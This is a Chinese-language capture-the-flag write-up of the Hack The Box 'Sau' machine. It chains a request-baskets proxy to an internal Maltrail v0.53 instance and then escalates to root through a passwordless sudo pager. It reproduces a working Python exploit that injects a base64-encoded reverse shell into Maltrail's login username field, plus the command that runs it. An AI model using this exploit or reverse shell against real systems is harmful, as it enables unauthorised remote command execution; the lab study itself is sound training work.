# Hack the box - Sau 
孫宏森、王政文

##  nmap
掃描後發現有開啟22，80，55555 port
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/1aff14b6-f8ad-4ef5-994e-aacf92756d20)

## Vulnerability discovery
嘗試開啟網站 
80 port 沒有回應

55555 port 可以進入一個網站
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/99de3bbb-48aa-4123-a1c5-eb1e81bf0500)
藉由左下角訊息我們可以知道網頁是 request-baskets 版本1.2.1

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/3bdee541-8797-424b-b9a2-f5733e3a5ef3)

> "Request Basket" 是一種工具或服務，用於捕捉和存儲HTTP請求。這對於開發和測試Web應用程序尤其有用，因為它可以作為一個存儲點來檢查發出的請求是否符合預期。

點擊creat按鈕 即可在右方建立新的basket
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/65712d8f-e2c6-4606-95ae-6a0687ff1168)

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/c7a7ecc3-aa54-4a73-a352-3f0b45f7656d)

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/8338d366-8cde-4098-b470-a284a3b42206)

前往該網址
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/38cf2531-7eac-4d43-adfc-9c58f2850ada)

進入一個新頁面 是一個maltrail網頁
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/044f5dc2-335d-4467-a5cf-2267be986ceb)
>
Maltrail是一種惡意交通檢測系統，它利用公開的惡意IP地址、域名和URL，以及特定的交通模式和用戶代理字符串等黑名單，來檢測和報告潛在的惡意流量。它可以被用作一種安全工具來監視和分析網絡交通，以識別可能的安全威脅，例如攻擊、感染或通訊的試圖。

可以看到log in不能點擊

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/fdce7d6b-8fd7-4b45-824f-8dc0d112de94)


在左下方也可以發現maltrail的版本

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/300005b1-2cf2-4810-b854-200c8ca0efab)

上網搜尋可以找到一個github資源(https://github.com/spookier/Maltrail-v0.53-Exploit)

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/c449d6a2-4725-4a8e-a8d0-0409bb48447b)

將code以exploit.py在本地建立

```
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```



## exploit

參考github的使用方法
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/1c0669cd-4425-40fc-8962-7c139380d8dd)
我們需要建立一個用來監聽的port
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/dc81bfc0-b8c4-4b29-8bf9-55f8840c6825)

使用指令
```
exploit.py 10.10.14.117 4444 http://10.10.11.224:55555/uhu60rk
```

成功連接
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/e5458d41-e042-4dfb-bb0a-f325ca096e13)




## GET FLAG

### user flag

可以直接找到user flag

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/35301358-3f5e-40c9-8ccd-d9682b8da6c0)

### root flag

使用sudo -l可以看到有不需要使用密碼就可以執行sudo的服務

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/c242165f-bc06-4819-ac34-264b6b86241b)

我們嘗試執行

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/4298a0eb-3a57-4fbb-af39-b7671636443a)

使用`!sh`可以執行最後一個以 sh 開頭的命令

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/a0559a2f-c479-4f1d-9ee3-a31880a8f9b8)

成功進入root權限

找到 root flag

![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/d5dca81f-efb1-4cef-a284-cb051941eac9)
